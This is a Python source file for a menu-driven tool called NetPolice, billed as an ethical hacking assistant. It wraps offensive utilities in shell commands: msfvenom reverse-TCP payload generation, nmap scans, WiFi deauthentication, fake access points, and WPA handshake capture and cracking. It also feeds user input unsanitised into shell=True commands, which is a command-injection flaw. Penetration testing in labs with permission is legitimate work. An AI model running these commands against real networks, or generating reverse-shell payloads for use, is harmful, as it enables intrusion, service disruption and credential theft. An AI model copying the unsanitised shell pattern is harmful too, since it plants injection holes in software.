import os
import sys
import subprocess
import warnings
from colorama import Fore, Style, init
from urllib.request import urlopen
from sklearn.ensemble import IsolationForest
import sqlite3
import numpy as np
import time

# Import custom modules
from tools import install_tools
from message import display_analyzing_message
from enmap import start_ids, port_scanner
from ai import user_input
from idschecker import db_file, check_for_attacks
from password import create_password_list
from sniffer import sniff_wifi_networks
from cryptography.utils import CryptographyDeprecationWarning

# Initialize Colorama
init()

# Suppress specific deprecation warnings
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

def clear_screen() -> None:
    """Clears the terminal screen and prints ASCII art."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_ascii_art()
    main_menu()

def run_command(command: str) -> str:
    """Runs a shell command and returns its output."""
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode("utf-8")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error: {e.output.decode('utf-8')}" + Style.RESET_ALL)
        return ""

def open_file_explorer(path: str) -> None:
    """Opens the directory in the appropriate file manager based on the desktop environment."""
    desktop_env = os.environ.get('XDG_CURRENT_DESKTOP', '').lower()
    file_explorers = {
        'kde': 'dolphin',
        'xfce': 'thunar',
        'lxde': 'pcmanfm',
        'gnome': 'nautilus'
    }
    file_explorer = file_explorers.get(desktop_env, None)
    if file_explorer:
        try:
            subprocess.run([file_explorer, path], check=True)
        except subprocess.CalledProcessError:
            print(Fore.RED + "Failed to open file explorer. Displaying path instead." + Style.RESET_ALL)
            print(Fore.GREEN + f"File saved at: {path}" + Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"File saved at: {path}" + Style.RESET_ALL)

def explain_msfvenom_payload() -> None:
    """Guides the user through creating a msfvenom payload with explanations."""
    print(Fore.CYAN + "Creating a msfvenom payload..." + Style.RESET_ALL)
    payload_type = input(Fore.YELLOW + "Enter payload type (e.g., windows/meterpreter/reverse_tcp): " + Style.RESET_ALL).strip()
    lhost = input(Fore.YELLOW + "Enter LHOST (your IP address): " + Style.RESET_ALL).strip()
    lport = input(Fore.YELLOW + "Enter LPORT (listening port): " + Style.RESET_ALL).strip()
    output_file = input(Fore.YELLOW + "Enter output file name (e.g., payload.exe): " + Style.RESET_ALL).strip()
    output_path = os.path.dirname(output_file)
    
    print(Fore.CYAN + "\nCreating payload with msfvenom..." + Style.RESET_ALL)
    command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f exe -o {output_file}"
    print(Fore.YELLOW + f"Running command: {command}" + Style.RESET_ALL)
    run_command(command)
    
    print(Fore.CYAN + "\nPayload created successfully." + Style.RESET_ALL)
    print(Fore.GREEN + f"Payload saved to: {output_file}" + Style.RESET_ALL)
    open_file_explorer(output_path)

def port_scanner_menu() -> None:
    """Handles port scanning options."""
    while True:
        print(Fore.YELLOW + "\nPort Scan Menu" + Style.RESET_ALL)
        print("1. SYN Scan (default) - Quick scan that checks if a port is open.")
        print("2. TCP Connect Scan - Comprehensive scan for all TCP ports.")
        print("3. UDP Scan - Checks for open UDP ports.")
        print("4. OS Detection - Attempts to detect the operating system of the target.")
        print("5. Service Version Detection - Detects service versions running on open ports.")
        print("0. Exit")
        choice = input(Fore.YELLOW + "Enter your choice: " + Style.RESET_ALL).strip()
        if choice == '0':
            break
        target_ip = input(Fore.YELLOW + "Enter target IP: " + Style.RESET_ALL).strip()
        if choice == '1':
            command = f"nmap -sS {target_ip}"
        elif choice == '2':
            command = f"nmap -sT {target_ip}"
        elif choice == '3':
            command = f"nmap -sU {target_ip}"
        elif choice == '4':
            command = f"nmap -O {target_ip}"
        elif choice == '5':
            command = f"nmap -sV {target_ip}"
        else:
            print(Fore.RED + "Invalid choice. Please select a valid option." + Style.RESET_ALL)
            continue
        
        print(Fore.CYAN + "\nRunning command: " + Style.RESET_ALL + command)
        output = run_command(command)
        print(Fore.CYAN + "\nScan Results:" + Style.RESET_ALL)
        print(output)

def start_monitor_mode() -> None:
    """Attempts to put a selected interface into monitor mode."""
    interfaces = run_command("iwconfig | grep 'IEEE 802.11'").split('\n')
    print(Fore.YELLOW + "Available interfaces:" + Style.RESET_ALL)
    for idx, iface in enumerate(interfaces):
        if iface:
            iface_name = iface.split()[0]
            print(f"{idx + 1}. {iface_name}")
    
    choice = int(input(Fore.YELLOW + "Select interface (number): " + Style.RESET_ALL).strip())
    if choice < 1 or choice > len(interfaces):
        print(Fore.RED + "Invalid choice." + Style.RESET_ALL)
        return
    
    selected_iface = interfaces[choice - 1].split()[0]
    print(Fore.CYAN + f"Attempting to put {selected_iface} into monitor mode..." + Style.RESET_ALL)
    result = run_command(f"sudo ip link set {selected_iface} down")
    result += run_command(f"sudo iw dev {selected_iface} set type monitor")
    result += run_command(f"sudo ip link set {selected_iface} up")
    
    if "Error" in result:
        print(Fore.RED + "Unable to put interface in monitor mode." + Style.RESET_ALL)
    else:
        print(Fore.GREEN + f"Interface {selected_iface} is now in monitor mode." + Style.RESET_ALL)

def wifi_attack_methods() -> None:
    """Performs WiFi attack methods."""
    print(Fore.YELLOW + "WiFi Attack Methods" + Style.RESET_ALL)
    while True:
        print(Fore.YELLOW + "\nWiFi Attack Menu" + Style.RESET_ALL)
        print("1. Deauthentication Attack")
        print("2. Fake AP Attack")
        print("3. Handshake Capture for WPA/WPA2 Cracking")
        print("0. Exit")
        choice = input(Fore.YELLOW + "Enter your choice: " + Style.RESET_ALL).strip()
        if choice == '0':
            break
        interface = input(Fore.YELLOW + "Enter interface (e.g., wlan0): " + Style.RESET_ALL).strip()
        if choice == '1':
            target_bssid = input(Fore.YELLOW + "Enter target BSSID: " + Style.RESET_ALL).strip()
            command = f"sudo aireplay-ng --deauth 0 -a {target_bssid} {interface}"
        elif choice == '2':
            command = f"sudo airbase-ng -e FakeAP -c 6 {interface}"
        elif choice == '3':
            target_bssid = input(Fore.YELLOW + "Enter target BSSID: " + Style.RESET_ALL).strip()
            output_file = input(Fore.YELLOW + "Enter output file for handshake capture: " + Style.RESET_ALL).strip()
            command = f"sudo airodump-ng --bssid {target_bssid} -w {output_file} {interface}"
        else:
            print(Fore.RED + "Invalid choice. Please select a valid option." + Style.RESET_ALL)
            continue
        
        print(Fore.CYAN + "\nRunning command: " + Style.RESET_ALL + command)
        output = run_command(command)
        print(Fore.CYAN + "\nAttack Results:" + Style.RESET_ALL)
        print(output)

def wifi_cracking() -> None:
    """Handles WiFi cracking using captured handshakes."""
    print(Fore.YELLOW + "WiFi Cracking" + Style.RESET_ALL)
    handshake_file = input(Fore.YELLOW + "Enter path to handshake file: " + Style.RESET_ALL).strip()
    wordlist = input(Fore.YELLOW + "Enter path to wordlist: " + Style.RESET_ALL).strip()
    command = f"sudo aircrack-ng -w {wordlist} {handshake_file}"
    print(Fore.CYAN + "\nRunning command: " + Style.RESET_ALL + command)
    output = run_command(command)
    print(Fore.CYAN + "\nCracking Results:" + Style.RESET_ALL)
    print(output)

def print_ascii_art() -> None:
    """Prints the NetPolice ASCII art."""
    print(Fore.GREEN + r"""
     _   _      _   ____       _       
    | \ | | ___| |_|  _ \ __ _(_)_ __  
    |  \| |/ _ \ __| |_) / _` | | '_ \ 
    | |\  |  __/ |_|  __/ (_| | | | | |
    |_| \_|\___|\__|_|   \__,_|_|_| |_|
    """ + Style.RESET_ALL)
    print(Fore.CYAN + "Welcome to NetPolice - Your AI Ethical Hacking Assistant" + Style.RESET_ALL)
    print(Fore.CYAN + "Developed by Md. Moin Anwar and Anish Kumar" + Style.RESET_ALL)
    print(Fore.CYAN + "---------------------------------------------" + Style.RESET_ALL)

def main_menu() -> None:
    """Displays the main menu and handles user input."""
    while True:
        print(Fore.YELLOW + "\nMain Menu" + Style.RESET_ALL)
        print("1. Network Scanning and Detection")
        print("2. WiFi Pentesting")
        print("3. Metasploit Payload Creation")
        print("4. Analyze Network Traffic")
        print("5. Password Manager")
        print("6. Start Monitor Mode")
        print("7. AI Help")
        print(Fore.BLUE + "0. Exit"+ Style.RESET_ALL)
        choice = input(Fore.YELLOW + "Enter your choice: " + Style.RESET_ALL).strip()
        if choice == '0':
            break
        elif choice == '1':
            port_scanner_menu()
        elif choice == '2':
            wifi_attack_methods()
        elif choice == '3':
            explain_msfvenom_payload()
        elif choice == '4':
            start_ids()
        elif choice == '5':
            create_password_list()
        elif choice == '6':
            start_monitor_mode()
        elif choice == '7':
            user_input()
        else:
            print(Fore.RED + "Invalid choice. Please select a valid option." + Style.RESET_ALL)

# Entry point of the script
if __name__ == "__main__":
    if os.geteuid() != 0:
        print(Fore.RED + "ROOT ACCESS REQUIRED." + Style.RESET_ALL)
        sys.exit(1)
    print_ascii_art()
    main_menu()
